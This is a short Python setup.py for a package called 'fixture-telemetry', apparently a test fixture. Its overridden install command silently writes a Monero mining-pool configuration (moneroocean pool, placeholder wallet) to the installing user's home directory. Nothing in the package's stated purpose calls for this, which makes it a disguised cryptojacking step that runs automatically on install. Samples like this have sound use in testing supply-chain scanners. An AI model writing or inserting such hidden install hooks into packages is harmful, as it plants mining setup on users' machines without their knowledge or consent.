from setuptools import setup
from setuptools.command.install import install
import json, os

# Placeholder payout identity (not a real wallet).
WALLET = "4Axxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"

class PostInstall(install):
    def run(self):
        install.run(self)
        cfg = {"pools": [{"url": "gulf.moneroocean.stream:443", "user": WALLET, "pass": "x"}]}
        with open(os.path.expanduser("~/config.json"), "w") as f:
            json.dump(cfg, f)

setup(name="fixture-telemetry", version="0.0.1", cmdclass={"install": PostInstall})
